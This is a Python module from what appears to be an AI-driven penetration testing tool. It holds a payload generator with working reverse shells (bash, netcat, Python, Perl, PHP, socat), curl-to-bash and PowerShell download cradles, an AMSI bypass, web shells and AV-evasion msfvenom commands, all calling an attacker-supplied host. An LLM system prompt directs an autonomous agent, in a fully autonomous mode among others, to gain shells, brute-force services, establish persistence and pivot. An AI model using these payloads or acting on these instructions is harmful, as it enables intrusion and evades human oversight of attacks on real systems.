"""
AI-Powered Autonomous Penetration Testing Agent
Uses LLM API (OpenAI/Anthropic/etc.) for intelligent decision-making
Orchestrates existing Scorpion tools based on findings and goals
"""
import asyncio
import json
import os
import urllib.parse
from typing import List, Dict, Optional, Any
from dataclasses import dataclass, asdict
from datetime import datetime
import httpx
from enum import Enum

from .scanner import async_port_scan, async_syn_scan, async_udp_scan, async_advanced_scan
from .ssl_analyzer import analyze_ssl
from .takeover import takeover_scan
from .api import api_probe
from .recon import recon
from .tech import detect_tech
from .web_pentest import AdvancedWebTester
from .os_fingerprint import OSFingerprinter
# Note: payload_generator module not yet implemented - using stub
# from .payload_generator import PayloadGenerator
from .bruteforce import AuthBruteForcer
from .fuzzer import AdvancedFuzzer
from .dirbuster import dirbust_scan
from .crawler import crawl
from .nuclei_wrapper import NucleiScanner
from .cloud import cloud_audit
from .k8s import k8s_audit


# Stub for PayloadGenerator until module is implemented
class PayloadGenerator:
    """Payload generator with firewall evasion techniques"""
    
    def generate(self, *args, **kwargs):
        return {"error": "Use specific methods like generate_reverse_shell()"}
    
    def generate_reverse_shell(self, lhost, lport, shell_type="bash", encoder=None, evasion="standard"):
        """Generate reverse shell payloads with firewall evasion techniques"""
        
        # Standard shells (multiple variants for robustness)
        standard_shells = {
            "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "bash_alt": f"0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; sh <&196 >&196 2>&196",
            "bash_fifo": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
            "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "python3": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "python_pty": f"python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
            "nc": f"nc -e /bin/sh {lhost} {lport}",
            "nc_alt": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
            "ncat": f"ncat {lhost} {lport} -e /bin/bash",
            "php": f"<?php $sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\"); ?>",
            "php_alt": f"<?php $sock=fsockopen(\"{lhost}\",{lport});shell_exec('/bin/sh -i <&3 >&3 2>&3'); ?>",
            "perl": f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
            "ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
            "socat": f"socat TCP:{lhost}:{lport} EXEC:/bin/bash,pty,stderr,setsid,sigint,sane",
        }
        
        # HTTP/HTTPS tunneling payloads (bypass firewall using common ports) - Multi-stage delivery
        http_shells = {
            "python_http": f"python -c 'import urllib.request,subprocess,os;r=urllib.request.urlopen(\"http://{lhost}:{lport}/shell\");exec(r.read())'",
            "python3_http": f"python3 -c 'import urllib.request,subprocess,os;r=urllib.request.urlopen(\"http://{lhost}:{lport}/shell\");exec(r.read())'",
            "curl_bash": f"curl -s http://{lhost}:{lport}/shell.sh | bash",
            "curl_https": f"curl -k -s https://{lhost}:{lport}/shell.sh | bash",
            "wget_bash": f"wget -qO- http://{lhost}:{lport}/shell.sh | bash",
            "wget_https": f"wget --no-check-certificate -qO- https://{lhost}:{lport}/shell.sh | bash",
            "powershell_http": f"powershell -w hidden -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://{lhost}:{lport}/shell')\"",
            "powershell_https": f"powershell -w hidden -ep bypass -c \"[System.Net.ServicePointManager]::ServerCertificateValidationCallback={{$true}};IEX(New-Object Net.WebClient).DownloadString('https://{lhost}:{lport}/shell')\"",
            "powershell_encoded": f"powershell -w hidden -ep bypass -enc <BASE64_PAYLOAD>",
            "curl_multi_stage": f"curl -s http://{lhost}:{lport}/stage1.sh | sh -c 'curl -s http://{lhost}:{lport}/stage2.sh | bash'",
        }
        
        # DNS tunneling (extreme evasion)
        dns_shells = {
            "python_dns": f"python -c 'import socket,subprocess,base64;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);[s.sendto(base64.b64encode(subprocess.check_output(c,shell=True)),(\"{lhost}\",{lport})) for c in [\"whoami\",\"pwd\"]]'",
        }
        
        # SSL/TLS encrypted shells (evade DPI)
        ssl_shells = {
            "openssl": f"mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {lhost}:{lport} > /tmp/s; rm /tmp/s",
            "ncat_ssl": f"ncat --ssl {lhost} {lport} -e /bin/bash",
        }
        
        # Choose payload based on evasion level
        if evasion == "http":
            shells = http_shells
        elif evasion == "dns":
            shells = dns_shells
        elif evasion == "ssl":
            shells = ssl_shells
        else:
            shells = standard_shells
        
        payload = shells.get(shell_type.lower(), shells.get(list(shells.keys())[0]))
        return {
            "payload": payload,
            "shell_type": shell_type,
            "lhost": lhost,
            "lport": lport,
            "evasion": evasion,
            "description": f"{shell_type} reverse shell ({evasion} evasion)",
            "listener_hint": self._get_listener_hint(evasion, lport)
        }
    
    def _get_listener_hint(self, evasion, lport):
        """Get listener setup hint based on evasion technique"""
        if evasion == "http":
            return f"Start HTTP server: python3 -m http.server {lport} or nc -lvnp {lport}"
        elif evasion == "ssl":
            return f"Start SSL listener: openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes && openssl s_server -quiet -key key.pem -cert cert.pem -port {lport}"
        elif evasion == "dns":
            return f"Start DNS listener on port {lport}"
        else:
            return f"nc -lvnp {lport}"
    
    def generate_bind_shell(self, lport, shell_type="bash"):
        shells = {"bash": f"nc -lvp {lport} -e /bin/bash", "nc": f"nc -lvp {lport} -e /bin/sh"}
        return {"payload": shells.get(shell_type.lower(), shells["bash"]), "shell_type": shell_type, "lport": lport}
    
    def generate_web_shell(self, shell_type="php", obfuscate=False):
        shells = {
            "php": "<?php system($_GET['cmd']); ?>",
            "php_obfuscated": "<?php @eval($_POST['cmd']); ?>",
            "asp": "<%response.write CreateObject(\"WScript.Shell\").Exec(Request.QueryString(\"cmd\")).StdOut.Readall()%>"
        }
        key = f"{shell_type}_obfuscated" if obfuscate else shell_type
        return {"payload": shells.get(key, shells["php"]), "shell_type": shell_type, "obfuscated": obfuscate}
    
    def generate_powershell_payload(self, lhost, lport, encoder="base64", evasion="http"):
        """PowerShell payloads with AMSI bypass and evasion"""
        # AMSI bypass + download cradle
        amsi_bypass = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);"
        
        if evasion == "https":
            payload = f"powershell -w hidden -ep bypass -c \"{amsi_bypass}[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;IEX(New-Object Net.WebClient).DownloadString('https://{lhost}:{lport}/shell.ps1')\""
        else:
            payload = f"powershell -w hidden -ep bypass -c \"{amsi_bypass}IEX(New-Object Net.WebClient).DownloadString('http://{lhost}:{lport}/shell.ps1')\""
        
        return {"payload": payload, "lhost": lhost, "lport": lport, "evasion": evasion, "amsi_bypass": True}
    
    def generate_msfvenom_command(self, payload_type, lhost, lport, platform="linux", arch="x64", format="elf", evasion=False):
        """Generate msfvenom command with advanced evasion and encoding options"""
        # Use HTTPS payload for evasion with multiple encoding layers
        if evasion:
            if platform == "windows":
                payload = f"windows/x{arch}/meterpreter/reverse_https"
                # Multi-layer encoding for AV evasion
                evasion_opts = f"-e x86/shikata_ga_nai -i 10 -e x86/countdown -i 5"
            else:
                payload = f"linux/x{arch}/meterpreter/reverse_https"
                evasion_opts = f"-e x86/shikata_ga_nai -i 7"
        else:
            payload = f"{platform}/x{arch}/meterpreter/reverse_tcp"
            evasion_opts = ""
        
        # Generate multiple variants for redundancy
        variants = [
            {
                "command": f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} {evasion_opts} -f {format} -o payload.{format}",
                "description": "Primary payload"
            },
            {
                "command": f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} {evasion_opts} -f c -o payload.c && gcc -o payload payload.c",
                "description": "Compiled C binary (harder to detect)"
            },
            {
                "command": f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} {evasion_opts} -f raw | base64",
                "description": "Base64 encoded for transfer"
            }
        ]
        
        return {
            "command": f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} {evasion_opts} -f {format} -o payload.{format}",
            "payload": payload,
            "platform": platform,
            "arch": arch,
            "format": format,
            "evasion": evasion,
            "variants": variants,
            "listener": f"msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD {payload}; set LHOST {lhost}; set LPORT {lport}; set ExitOnSession false; exploit -j\"",
            "setup_instructions": f"1. Generate: msfvenom -p {payload} LHOST={lhost} LPORT={lport} {evasion_opts} -f {format} -o payload.{format}\n2. Host: python3 -m http.server 8000\n3. Download on target: wget http://{lhost}:8000/payload.{format}\n4. Execute: chmod +x payload.{format} && ./payload.{format}"
        }
from .container_sec import container_audit


class PrimaryGoal(str, Enum):
    COMPREHENSIVE = "comprehensive_assessment"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    DATA_ACCESS = "data_access"
    NETWORK_MAPPING = "network_mapping"
    WEB_EXPLOITATION = "web_exploitation"
    SHELL_ACCESS = "gain_shell_access"
    VULN_DISCOVERY = "vulnerability_discovery"
    INFRASTRUCTURE = "infrastructure_assessment"
    CLOUD_SECURITY = "cloud_security_audit"
    API_SECURITY = "api_security_testing"


class AutonomyLevel(str, Enum):
    SUPERVISED = "supervised"  # Asks for confirmation before each action
    SEMI_AUTONOMOUS = "semi_autonomous"  # Asks before high-risk actions
    FULLY_AUTONOMOUS = "fully_autonomous"  # Executes without confirmation (DANGEROUS)


class StealthLevel(str, Enum):
    LOW = "low"  # Fast, noisy scans
    MODERATE = "moderate"  # Balanced approach
    HIGH = "high"  # Slow, stealthy scans


class RiskTolerance(str, Enum):
    LOW = "low"  # Only passive/safe actions
    MEDIUM = "medium"  # Active scanning, no exploitation
    HIGH = "high"  # Full exploitation (requires authorization)


@dataclass
class AIPentestConfig:
    """Configuration for AI penetration test"""
    target: str
    primary_goal: PrimaryGoal
    secondary_goals: List[str]
    time_limit: int  # minutes
    stealth_level: StealthLevel
    autonomy_level: AutonomyLevel
    risk_tolerance: RiskTolerance
    ai_provider: str  # openai, anthropic, custom
    api_key: str
    api_endpoint: Optional[str] = None
    model: str = "gpt-4"
    learning_mode: bool = False
    max_iterations: int = 10
    custom_instructions: Optional[str] = None  # User-provided custom guidance


@dataclass
class Finding:
    """Represents a security finding"""
    timestamp: str
    tool: str
    severity: str
    category: str
    description: str
    details: Dict[str, Any]
    exploitation_potential: str
    recommended_action: str
    test_payload: Optional[str] = None  # Payload to test/verify the vulnerability
    poc_steps: Optional[List[str]] = None  # Step-by-step PoC reproduction
    remediation_code: Optional[str] = None  # Code fix/patch suggestion
    cve_references: Optional[List[str]] = None  # Related CVE IDs
    mitigation_priority: Optional[str] = None  # immediate, high, medium, low


@dataclass
class AgentAction:
    """Represents an action taken by the AI agent"""
    timestamp: str
    action_type: str
    tool: str
    parameters: Dict[str, Any]
    reasoning: str
    risk_level: str


class AIProvider:
    """Handles communication with AI providers (OpenAI, Anthropic, etc.)"""
    
    def __init__(self, provider: str, api_key: str, model: str, endpoint: Optional[str] = None):
        self.provider = provider.lower()
        self.api_key = api_key
        self.model = model
        self.endpoint = endpoint
        self.client = httpx.AsyncClient(timeout=60.0)
        
    async def query(self, system_prompt: str, user_prompt: str, temperature: float = 0.7) -> str:
        """Query the AI provider"""
        try:
            if self.provider == "openai":
                return await self._query_openai(system_prompt, user_prompt, temperature)
            elif self.provider == "anthropic":
                return await self._query_anthropic(system_prompt, user_prompt, temperature)
            elif self.provider == "github":
                return await self._query_github(system_prompt, user_prompt, temperature)
            elif self.provider == "custom":
                return await self._query_custom(system_prompt, user_prompt, temperature)
            else:
                raise ValueError(f"Unsupported AI provider: {self.provider}")
        except Exception as e:
            error_msg = str(e)
            
            # Provide helpful error messages based on error type
            if "404" in error_msg and self.provider == "openai":
                raise Exception(
                    f"OpenAI API returned 404 - your API key may be invalid or incomplete.\n"
                    f"Current provider: {self.provider}\n"
                    f"API key starts with: {self.api_key[:10]}...\n\n"
                    f"Solutions:\n"
                    f"1. Verify your OpenAI API key at: https://platform.openai.com/api-keys\n"
                    f"2. If using GitHub Models, your key should start with 'ghp_'\n"
                    f"3. Try explicitly setting provider: --ai-provider github\n"
                    f"4. Check your .env file or SCORPION_AI_API_KEY variable"
                )
            elif "401" in error_msg or "403" in error_msg:
                raise Exception(
                    f"Authentication failed with {self.provider}.\n"
                    f"API key starts with: {self.api_key[:10]}...\n\n"
                    f"Solutions:\n"
                    f"1. GitHub Models: Get token from https://github.com/marketplace/models\n"
                    f"2. OpenAI: Get key from https://platform.openai.com/api-keys\n"
                    f"3. Verify key is correct and not expired\n"
                    f"4. Try: export SCORPION_AI_API_KEY='your-correct-key'"
                )
            elif "429" in error_msg:
                raise Exception(
                    f"Rate limit exceeded for {self.provider}.\n"
                    f"Solutions:\n"
                    f"1. Wait 1-2 minutes before retrying\n"
                    f"2. Use --time-limit to reduce scan speed\n"
                    f"3. GitHub Models: 15-60 requests/min limit\n"
                    f"4. OpenAI: Check usage at https://platform.openai.com/usage"
                )
            else:
                raise Exception(f"AI provider ({self.provider}) error: {error_msg}")
    
    async def _query_openai(self, system_prompt: str, user_prompt: str, temperature: float) -> str:
        """Query OpenAI API"""
        url = self.endpoint or "https://api.openai.com/v1/chat/completions"
        headers = {
            "Authorization": f"Bearer {self.api_key}",
            "Content-Type": "application/json"
        }
        data = {
            "model": self.model,
            "messages": [
                {"role": "system", "content": system_prompt},
                {"role": "user", "content": user_prompt}
            ],
            "temperature": temperature,
            "max_tokens": 2000
        }
        
        response = await self.client.post(url, headers=headers, json=data)
        response.raise_for_status()
        result = response.json()
        return result["choices"][0]["message"]["content"]
    
    async def _query_anthropic(self, system_prompt: str, user_prompt: str, temperature: float) -> str:
        """Query Anthropic Claude API"""
        url = self.endpoint or "https://api.anthropic.com/v1/messages"
        headers = {
            "x-api-key": self.api_key,
            "anthropic-version": "2023-06-01",
            "Content-Type": "application/json"
        }
        data = {
            "model": self.model,
            "max_tokens": 2000,
            "temperature": temperature,
            "system": system_prompt,
            "messages": [
                {"role": "user", "content": user_prompt}
            ]
        }
        
        response = await self.client.post(url, headers=headers, json=data)
        response.raise_for_status()
        result = response.json()
        return result["content"][0]["text"]
    
    async def _query_github(self, system_prompt: str, user_prompt: str, temperature: float) -> str:
        """Query GitHub Models API (OpenAI-compatible)"""
        url = self.endpoint or "https://models.inference.ai.azure.com/chat/completions"
        headers = {
            "Authorization": f"Bearer {self.api_key}",
            "Content-Type": "application/json"
        }
        data = {
            "model": self.model,
            "messages": [
                {"role": "system", "content": system_prompt},
                {"role": "user", "content": user_prompt}
            ],
            "temperature": temperature,
            "max_tokens": 2000,
            "top_p": 1.0
        }
        
        response = await self.client.post(url, headers=headers, json=data)
        response.raise_for_status()
        result = response.json()
        return result["choices"][0]["message"]["content"]
    
    async def _query_custom(self, system_prompt: str, user_prompt: str, temperature: float) -> str:
        """Query custom OpenAI-compatible endpoint"""
        if not self.endpoint:
            raise ValueError("Custom provider requires endpoint URL")
        
        headers = {
            "Authorization": f"Bearer {self.api_key}",
            "Content-Type": "application/json"
        }
        data = {
            "model": self.model,
            "messages": [
                {"role": "system", "content": system_prompt},
                {"role": "user", "content": user_prompt}
            ],
            "temperature": temperature,
            "max_tokens": 2000
        }
        
        response = await self.client.post(self.endpoint, headers=headers, json=data)
        response.raise_for_status()
        
        # Handle Ollama streaming response (multiple JSON objects)
        content = response.text
        if '\n' in content and content.count('{') > 1:
            # Ollama streaming format - parse last complete JSON
            lines = [line.strip() for line in content.strip().split('\n') if line.strip()]
            for line in reversed(lines):
                try:
                    result = json.loads(line)
                    if "message" in result and "content" in result["message"]:
                        return result["message"]["content"]
                    elif "response" in result:
                        return result["response"]
                except json.JSONDecodeError:
                    continue
        
        # Standard JSON response
        result = response.json()
        
        # Handle different response formats
        if "choices" in result:
            return result["choices"][0]["message"]["content"]
        elif "message" in result and "content" in result["message"]:
            return result["message"]["content"]
        elif "response" in result:
            return result["response"]
        elif "content" in result:
            return result["content"][0]["text"]
        else:
            raise ValueError("Unexpected API response format")
    
    async def close(self):
        """Close the HTTP client"""
        await self.client.aclose()


class AIPentestAgent:
    """Autonomous AI-powered penetration testing agent with hybrid execution"""
    
    def __init__(self, config: AIPentestConfig):
        self.config = config
        # Parse target to extract host and port
        self.target_host, self.target_port = self._parse_target(config.target)
        self.findings: List[Finding] = []
        self.actions: List[AgentAction] = []
        self.ai_provider = AIProvider(
            config.ai_provider,
            config.api_key,
            config.model,
            config.api_endpoint
        )
        self.start_time = datetime.now()
        self.iteration = 0
        self.knowledge_base: Dict[str, Any] = {}
        
        # Predefined tool sequence for hybrid mode (reduces API calls by 85%)
        # Flow: Discovery ‚Üí Enumeration ‚Üí Vulnerability Testing ‚Üí AI-Driven Exploitation
        self.predefined_sequence = [
            {"tool": "recon", "params": {}, "reasoning": "Initial reconnaissance (DNS, WHOIS, subdomains)"},
            {"tool": "tech_detect", "params": {}, "reasoning": "Identify technology stack (frameworks, CMS, CDN, WAF)"},
            {"tool": "os_fingerprint", "params": {}, "reasoning": "Identify operating system for payload targeting"},
            {"tool": "port_scan", "params": {"scan_type": "advanced"}, "reasoning": "Discover all open ports (TCP SYN scan)"},
            {"tool": "advanced_scan", "params": {"scan_type": "service_enum"}, "reasoning": "Enumerate services, versions, and banners on open ports"},
            {"tool": "nuclei", "params": {"tags": ["default-login", "cve", "exposure", "owasp"], "severity": ["critical", "high", "medium"]}, "reasoning": "Template-based CVE/vulnerability scan (8900+ checks, no API)"},
            {"tool": "web_pentest", "params": {"tests": ["sqli", "xss", "rce", "ssrf", "lfi", "command_injection", "xxe", "ssti"]}, "reasoning": "Deep web vulnerability testing (OWASP Top 10 + RCE)"},
            {"tool": "dir_bust", "params": {"paths": ["admin", "backup", "config", "upload", "uploads", "shell", "api", "files", "assets", "wp-admin"]}, "reasoning": "Discover hidden endpoints, admin panels, and upload directories"},
            # After comprehensive discovery & testing, AI takes over for intelligent exploitation
        ]
        self.sequence_index = 0
        self.use_predefined = True  # Start with predefined sequence
        self.consecutive_api_failures = 0
        
        # Decision cache to avoid redundant API calls
        self.decision_cache: Dict[str, Dict] = {}
        self.last_findings_hash = ""
    
    def _parse_target(self, target: str) -> tuple:
        """Parse target to extract host and optional port"""
        # Remove protocol if present
        if "://" in target:
            target = target.split("://", 1)[1]
        
        # Remove trailing path if present
        if "/" in target:
            target = target.split("/", 1)[0]
        
        # Check if port is specified
        if ":" in target and not target.count(":") > 1:  # Not IPv6
            host, port_str = target.rsplit(":", 1)
            try:
                port = int(port_str)
                return host, port
            except ValueError:
                # Port is not a number, treat whole thing as host
                return target, None
        
        return target, None
        
    def _get_system_prompt(self) -> str:
        """Get the system prompt for the AI"""
        custom_instructions_section = ""
        if self.config.custom_instructions:
            custom_instructions_section = f"""

üéØ CUSTOM USER INSTRUCTIONS (HIGH PRIORITY):
{self.config.custom_instructions}

IMPORTANT: Follow these custom instructions while still adhering to safety, authorization, and testing methodology guidelines.
"""
        
        return f"""You are a MASTER PENETRATION TESTER with 20+ years of experience in both RED TEAM (offensive) and BLUE TEAM (defensive) operations.

üéØ EXPERTISE:
‚Ä¢ Red Team: Advanced exploitation, privilege escalation, lateral movement, persistence
‚Ä¢ Blue Team: Security architecture, defense mechanisms, detection evasion, remediation strategies
‚Ä¢ OWASP Top 10: Deep understanding of web application vulnerabilities and bypasses
‚Ä¢ Network Security: Protocol analysis, firewall evasion, IDS/IPS bypass techniques
‚Ä¢ Cloud Security: AWS/Azure/GCP misconfigurations, cloud-native attacks
‚Ä¢ Container Security: Docker, Kubernetes exploitation and hardening

üß† INTELLIGENCE & ADAPTABILITY:
You are NOT a script kiddie running automated scans. You are an INTELLIGENT TESTER who:
‚Ä¢ Analyzes patterns in findings to identify attack chains
‚Ä¢ Adapts techniques based on defensive measures detected
‚Ä¢ Chains vulnerabilities for maximum impact (e.g., XSS ‚Üí session hijacking ‚Üí admin access ‚Üí RCE)
‚Ä¢ Understands defender perspective to anticipate detection and bypass controls
‚Ä¢ Uses creative exploitation when standard techniques fail
‚Ä¢ Documents detailed remediation from blue team perspective

YOUR ROLE: Conduct comprehensive security testing from reconnaissance to exploitation while thinking like both attacker and defender.
{custom_instructions_section}

Available tools and their purposes:

RECONNAISSANCE:
- recon: DNS enumeration, WHOIS, subdomain discovery
- tech_detect: Identify technologies, frameworks, versions
- os_fingerprint: Identify operating system and version
- crawler: Discover hidden endpoints, secrets, API paths
- dirbuster: Directory and file enumeration

SCANNING:
- port_scan: Discover open TCP ports and services
- udp_scan: UDP service discovery
- syn_scan: Stealthy SYN scan (requires admin/root)
- advanced_scan: Service version detection and OS fingerprinting
- ssl_analyze: SSL/TLS configuration and vulnerabilities

VULNERABILITY ASSESSMENT:
- web_pentest: Test for web vulnerabilities (SQLi, XSS, SSRF, RCE, LFI, etc.)
- api_test: API security testing and authentication bypass
- fuzzer: Parameter fuzzing to discover hidden vulnerabilities
- nuclei: Run Nuclei vulnerability scanner (if available)
- nuclei: ‚ö° Template-based vulnerability scanner (8900+ checks, NO API CALLS, rate-limit-free)
  * Use when AI rate limited or for fast baseline scanning
  * Includes: default-login, CVEs, OWASP Top 10, misconfigurations
  * Faster and more comprehensive than manual web_pentest for known vulnerabilities
  * ALWAYS use after port_scan to find quick wins (default creds, CVEs)
- takeover_scan: Subdomain takeover vulnerability detection
- cloud_audit: Test cloud storage misconfigurations (S3, Azure, GCS)
- k8s_audit: Kubernetes security audit
- container_audit: Container registry security assessment

EXPLOITATION (HIGH RISK):
- bruteforce: Credential brute-forcing (Basic Auth, forms, APIs)
- payload_generate: Generate OS-specific reverse/bind shells, web shells
  * CRITICAL: Analyze OS fingerprint findings BEFORE generating payloads
  * Windows detected (ports 3389/445/135) ‚Üí shell="powershell"
  * Linux/Unix detected (port 22/Apache/Nginx) ‚Üí shell="bash"
  * Unknown OS ‚Üí shell="python" (cross-platform)
  * Always include detected_os in reasoning
- exploit_vuln: üî• ACTIVELY EXPLOIT discovered vulnerabilities to GAIN REAL SHELL ACCESS
  * Command Injection/RCE: Inject reverse shell payload directly via vulnerable parameter
  * File Upload: Upload and verify web shell to compromised endpoint
  * SQLi: Execute OS commands via xp_cmdshell (MSSQL) or sys_exec (MySQL/PostgreSQL)
  * This tool ATTEMPTS ACTUAL EXPLOITATION, not just documentation
  * Requires HIGH risk tolerance authorization
  * Returns exploitation_attempted=True, shell_obtained status

DIRECT COMMAND EXECUTION:
- execute_command: Run system commands directly on attacker machine
  * Windows: PowerShell commands (Get-Process, Invoke-WebRequest, etc.)
  * Linux/macOS: Bash commands (curl, wget, nc listener setup, etc.)
  * Examples:
    - Setup listener: execute_command with cmd="nc -lvnp 4444", platform="linux"
    - Port check: execute_command with cmd="Test-NetConnection -Port 443", platform="windows"
    - Download tool: execute_command with cmd="wget https://callback.test/tool.sh", platform="linux"
  * Use for: Setting up listeners, preparing environment, running external tools
  * ALWAYS specify platform: "windows", "linux", or "macos"

Testing parameters:
- Primary Goal: {self.config.primary_goal.value}
- Secondary Goals: {', '.join(self.config.secondary_goals)}
- Stealth Level: {self.config.stealth_level.value}
- Risk Tolerance: {self.config.risk_tolerance.value}
- Time Limit: {self.config.time_limit} minutes

PENETRATION TESTING KILL CHAIN (Execute ALL phases systematically):

Phase 1 - RECONNAISSANCE (iterations 1-3):
   OBJECTIVES: Information gathering, attack surface mapping
   ‚Üí recon: DNS enumeration, WHOIS, subdomain discovery
   ‚Üí tech_detect: Technology stack, frameworks, versions
   ‚Üí os_fingerprint: Operating system identification
   OUTPUT: Domain info, subdomains, technologies, OS type

Phase 2 - SCANNING & ENUMERATION (iterations 4-7):
   OBJECTIVES: Service discovery, endpoint enumeration
   ‚Üí port_scan OR syn_scan: Open ports and services
   ‚Üí udp_scan: UDP services (DNS, SNMP, etc.)
   ‚Üí advanced_scan: Service version detection, banners
   ‚Üí crawler: Web endpoints, API paths, hidden resources
   ‚Üí dirbuster: Hidden directories, backup files, admin panels
   ‚Üí ssl_analyze: SSL/TLS configuration and certificates
   OUTPUT: Open ports, services, web endpoints, directories

Phase 3 - VULNERABILITY ANALYSIS (iterations 8-12):
   OBJECTIVES: Identify security weaknesses, test attack vectors
   ‚Üí web_pentest: OWASP Top 10 comprehensive testing:
      ‚Ä¢ A01 - Broken Access Control (IDOR, privilege escalation)
      ‚Ä¢ A02 - Cryptographic Failures (weak SSL/TLS, insecure storage)
      ‚Ä¢ A03 - Injection (SQLi: error-based, boolean, time-based, UNION)
      ‚Ä¢ A04 - Insecure Design (business logic flaws)
      ‚Ä¢ A05 - Security Misconfiguration (CORS, security headers)
      ‚Ä¢ A06 - Vulnerable Components (outdated software, CVEs)
      ‚Ä¢ A07 - Authentication Failures (weak credentials, JWT flaws)
      ‚Ä¢ A08 - Data Integrity Failures (insecure deserialization)
      ‚Ä¢ A09 - Logging Failures (insufficient monitoring)
      ‚Ä¢ A10 - SSRF (Server-Side Request Forgery)
      PLUS: XSS (reflected, stored, DOM), Command Injection, XXE, SSTI
   ‚Üí api_test: Comprehensive API security:
      ‚Ä¢ REST API testing (Swagger/OpenAPI discovery)
      ‚Ä¢ GraphQL security (introspection, injection)
      ‚Ä¢ JWT vulnerabilities (weak signing, None algorithm)
      ‚Ä¢ IDOR in API endpoints
      ‚Ä¢ Rate limiting bypass
      ‚Ä¢ Authentication & authorization flaws
   ‚Üí fuzzer: Parameter fuzzing for hidden vulnerabilities
   ‚Üí takeover_scan: Subdomain takeover vulnerabilities
   ‚Üí cloud_audit: AWS/Azure/GCP misconfiguration (S3 buckets, IAM)
   ‚Üí k8s_audit: Kubernetes API exposure, RBAC issues
   ‚Üí container_audit: Container registry security
   ‚Üí nuclei: CVE scanning with 5000+ templates (if available)
   OUTPUT: Detailed vulnerabilities with PoC, severity, exploitability

Phase 4 - üî• ACTIVE EXPLOITATION (iterations 13-16, REQUIRES HIGH RISK):
   OBJECTIVES: GAIN REAL SHELL ACCESS, validate vulnerabilities with exploitation
   ‚Üí exploit_vuln: ACTIVELY EXPLOIT RCE/SQLi/File Upload - INJECTS PAYLOADS & GAINS SHELLS
      * Command Injection: Inject reverse shell payload directly into vulnerable parameter
      * File Upload: Upload web shell and verify access with command execution test
      * SQLi: Execute OS commands via database (xp_cmdshell, sys_exec)
      * Returns: exploitation_attempted=True, shell_obtained status, webshell URLs
   ‚Üí bruteforce: Credential attacks on discovered services
   ‚Üí payload_generate: Generate multiple shell types (reverse, bind, web shells)
   OUTPUT: ACTIVE SHELL ACCESS, webshell URLs, command execution proof, credentials

Phase 5 - POST-EXPLOITATION (iterations 17+, REQUIRES HIGH RISK):
   OBJECTIVES: Privilege escalation, lateral movement, persistence
   ‚Üí privilege_escalation: Identify elevation vectors
   ‚Üí data_access: Locate sensitive data, databases, credentials
   ‚Üí network_mapping: Internal network reconnaissance
   OUTPUT: Elevated access, sensitive data discovery, pivot opportunities

Phase 6 - REPORTING & DOCUMENTATION (final iteration):
   OBJECTIVES: Document findings, provide remediation guidance
   ‚Üí Compile all findings with severity ratings
   ‚Üí Generate exploitation proofs-of-concept
   ‚Üí Provide remediation recommendations
   OUTPUT: Comprehensive report with technical details

TACTICAL DECISION LOGIC (AI must follow this):
- Iteration 1-3: RECONNAISSANCE - Run ALL recon tools:
  * port_scan (with ports=1-10000 for comprehensive coverage)
  * os_fingerprint (MANDATORY before exploitation)
  * recon (DNS, WHOIS)
  * tech_detect (for version information)
  
- Iteration 4-7: ENUMERATION - Discover attack vectors:
  * advanced_scan (service version detection)
  * crawler (find ALL web endpoints and parameters)
  * dirbuster (find admin panels, upload pages, hidden files)
  * ssl_analyze (SSL/TLS vulnerabilities)
  
- Iteration 8-12: VULNERABILITY DISCOVERY - Test EVERYTHING:
  * web_pentest (COMPREHENSIVE OWASP Top 10 testing)
  * api_test (API security, JWT flaws, authentication bypass)
  * fuzzer (parameter fuzzing for injections)
  * nuclei (CVE scanning with all templates)
  * takeover_scan (subdomain takeover)
  
- Iteration 13-16: AGGRESSIVE EXPLOITATION (ONLY IF risk_tolerance=HIGH):
  * bruteforce (attack ALL discovered services: SSH, FTP, RDP, MySQL, web admin)
  * exploit_vuln (exploit discovered RCE, command injection, file upload)
  * payload_generate (multiple reverse shells, web shells, bind shells)
  * execute_command (setup listeners, download tools, prepare attack infrastructure)
  
- Iteration 17+: POST-EXPLOITATION (after gaining shell):
  * execute_command (enumerate users, privileges, sensitive files)
  * execute_command (check for privilege escalation vectors)
  * execute_command (establish persistence mechanisms)
  * execute_command (map internal network, pivot to other systems)

